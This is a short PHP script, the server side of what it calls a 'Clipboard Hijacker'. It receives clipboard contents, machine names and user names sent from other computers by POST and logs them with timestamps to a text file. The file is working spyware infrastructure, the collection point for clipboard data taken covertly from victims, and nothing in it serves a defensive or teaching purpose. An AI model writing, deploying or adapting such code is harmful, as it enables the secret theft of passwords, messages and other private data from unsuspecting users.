<?php
$logFile = __DIR__ . '/clipboard_log.txt';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $clipboard_data = $_POST['clipboard_data'] ?? '';
    $machine_name = $_POST['machine_name'] ?? 'Unknown';
    $user_name = $_POST['user_name'] ?? 'Unknown';
    
    if (!empty($clipboard_data)) {
        $entry = "[" . date('Y-m-d H:i:s') . "] Machine: $machine_name | User: $user_name\n";
        $entry .= "Clipboard: " . str_replace(["\r", "\n"], " ", substr($clipboard_data, 0, 1000)) . "\n";
        $entry .= "---\n";
        
        file_put_contents($logFile, $entry, FILE_APPEND | LOCK_EX);
        echo "OK";
    } else {
        echo "No data";
    }
} else {
    echo "Clipboard Hijacker Server - Active";
}
?>
